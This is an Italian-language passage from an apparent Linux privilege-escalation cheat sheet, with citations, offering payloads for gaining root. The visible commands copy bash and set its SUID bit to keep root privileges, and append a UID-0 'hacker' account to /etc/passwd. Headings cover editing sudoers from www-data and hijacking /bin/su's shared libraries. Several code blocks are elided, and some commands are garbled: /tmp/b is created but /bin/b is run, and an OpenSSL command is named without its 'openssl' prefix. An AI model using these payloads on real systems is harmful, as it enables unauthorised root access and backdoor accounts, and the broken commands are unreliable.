...
`bash -p` abilita la modalità privilegiata: quando Bash viene avviato con ID reali ed effettivi differenti, non reimposta l'ID effettivo sull'ID reale. La shell risultante dipende comunque dalle credenziali esistenti del chiamante.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
`setresuid` modifica gli ID reale, effettivo e salvato quando è consentito, mentre `setuid` modifica l'ID effettivo e può anche impostare gli ID reale e salvato per un chiamante privilegiato. `execve` sostituisce l'immagine del processo corrente con il programma richiesto.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup> Questi esempi omettono i controlli del valore restituito; entrambe le chiamate alle credenziali possono avere esito negativo anche per UID 0.<sup>[[2]](#references)[[3]](#references)</sup>
```c
...
Questi sono file e interfacce locali comuni per il controllo dei privilegi: `/etc/passwd` memorizza i record degli account composti da sette campi, `/etc/shadow` memorizza i dati opzionali delle password crittografate, `sudoers` definisce i privilegi di sudo e tag come `NOPASSWD`, mentre l'endpoint daemon predefinito di Docker è un socket Unix in `/var/run/docker.sock`; l'accesso a quel socket può garantire il controllo a livello root dell'host.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)</sup>
...
Controllare quali librerie condivise utilizza un binario; in questo esempio, ispezionare `/bin/su` con `ldd`.<sup>[[9]](#references)</sup>
```bash
ldd /bin/su
...
```
`ldd` segnala le dipendenze dagli oggetti condivisi, mentre il linker dinamico utilizza i metadati ELF e le relative regole di ricerca per caricarli a runtime.<sup>[[9]](#references)[[10]](#references)</sup>

Per esaminare un candidato, usa `objdump -T` per stampare la tabella dei simboli dinamici di `su` e filtrare i nomi di audit.<sup>[[11]](#references)</sup>
```bash
...
```
`audit_open`, `audit_log_user_message` e `audit_log_acct_message` sono funzioni di libaudit; `audit_fd` è mostrato come un oggetto dati definito nella sezione `.bss` di `su` in questo output.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup> Una libreria sostitutiva deve esportare definizioni compatibili per i simboli non definiti che il loader risolve; ABI di funzioni/dati non corrispondenti possono comunque causare il fallimento del processo quando tali simboli vengono rilocati o chiamati.<sup>[[10]](#references)[[11]](#references)</sup>
...
```
Se il replacement viene caricato correttamente da un processo **`/bin/su`** privilegiato, questo constructor può avviare **`/bin/bash`** con i privilegi di quel processo; il risultato esatto dipende dall'ambiente.<sup>[[10]](#references)[[15]](#references)</sup>

## Script

Puoi fare in modo che root esegua qualcosa?

`sudoers` utilizza il tag `NOPASSWD` nelle policy entry, `chpasswd` legge coppie `user:password` dallo standard input e `/etc/passwd` utilizza sette campi dell'account separati da due punti; gli esempi seguenti presuppongono che i file pertinenti siano scrivibili dal processo che li esegue.<sup>[[5]](#references)[[6]](#references)[[16]](#references)</sup>

### **Da www-data a sudoers**
```bash
...
Il payload finale dipende da un target che accetta l'hash `crypt` generato: `mkpasswd -m sha-512` di Debian corrisponde a SHA-512 crypt (`$6$`), mentre `passwd -1 -salt` di OpenSSL utilizza l'algoritmo BSD basato su MD5 (`$1$`).<sup>[[17]](#references)[[18]](#references)</sup>
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
## References

- [1] [Il builtin Set (Manuale di riferimento di Bash)](https://www.gnu.org/s/bash/manual/html_node/The-Set-Builtin.html)
